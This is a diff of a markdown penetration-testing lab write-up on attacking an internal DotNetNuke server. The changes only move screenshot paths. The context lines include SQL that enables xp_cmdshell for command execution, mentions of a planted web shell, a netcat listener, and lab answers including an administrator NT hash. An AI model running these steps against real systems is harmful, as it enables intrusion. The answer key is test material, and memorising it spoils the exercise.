@@ -306,11 +306,11 @@ http://172.16.8.20:80/ [200 OK] ASP_NET[ViewState Encrypted], Bootstrap, Cookies
 └─$ firefox http://172.16.8.20:80/ &
 ```
 
-![Firefox - Proxy Settings](./assets/attacking_enterprise_networks_internal_testing_02.png)
+![Firefox - Proxy Settings](./assets/screenshots/attacking_enterprise_networks_internal_testing_02.png)
 
-![Firefox - DotNetNuke (DNN) Homepage](./assets/attacking_enterprise_networks_internal_testing_03.png)
+![Firefox - DotNetNuke (DNN) Homepage](./assets/screenshots/attacking_enterprise_networks_internal_testing_03.png)
 
-![Firefox - DotNetNuke (DNN) Login 1](./assets/attacking_enterprise_networks_internal_testing_04.png)
+![Firefox - DotNetNuke (DNN) Login 1](./assets/screenshots/attacking_enterprise_networks_internal_testing_04.png)
 
 ```yaml
 credentials:
@@ -330,7 +330,7 @@ Questions:
 1. Retrieve the contents of the SAM database on the `DEV01` host. Submit the NT hash of the administrator user as your answer. `0e20798f695ab0d04bc138b22344cea8`
 2. Escalate privileges on the DEV01 host. Submit the contents of the `flag.txt` file on the `Administrator` Desktop. `K33p_************`
 
-![Firefox - DotNetNuke (DNN) SQL Console 1](./assets/attacking_enterprise_networks_internal_testing_05.png)
+![Firefox - DotNetNuke (DNN) SQL Console 1](./assets/screenshots/attacking_enterprise_networks_internal_testing_05.png)
 
 ```sql
 EXEC sp_configure 'show advanced options', '1';
@@ -340,15 +340,15 @@ RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 ```
 
-![Firefox - DotNetNuke (DNN) SQL Console 2](./assets/attacking_enterprise_networks_internal_testing_06.png)
+![Firefox - DotNetNuke (DNN) SQL Console 2](./assets/screenshots/attacking_enterprise_networks_internal_testing_06.png)
 
-![Firefox - DotNetNuke (DNN) Allowable File Extensions 1](./assets/attacking_enterprise_networks_internal_testing_07.png)
+![Firefox - DotNetNuke (DNN) Allowable File Extensions 1](./assets/screenshots/attacking_enterprise_networks_internal_testing_07.png)
 
-![Firefox - DotNetNuke (DNN) Allowable File Extensions 2](./assets/attacking_enterprise_networks_internal_testing_08.png)
+![Firefox - DotNetNuke (DNN) Allowable File Extensions 2](./assets/screenshots/attacking_enterprise_networks_internal_testing_08.png)
 
-![Firefox - DotNetNuke (DNN) File Management](./assets/attacking_enterprise_networks_internal_testing_09.png)
+![Firefox - DotNetNuke (DNN) File Management](./assets/screenshots/attacking_enterprise_networks_internal_testing_09.png)
 
-![Firefox - DotNetNuke (DNN) Web Shell](./assets/attacking_enterprise_networks_internal_testing_10.png)
+![Firefox - DotNetNuke (DNN) Web Shell](./assets/screenshots/attacking_enterprise_networks_internal_testing_10.png)
 
 ```
 root@dmz01:~# nc -lvnp 1337
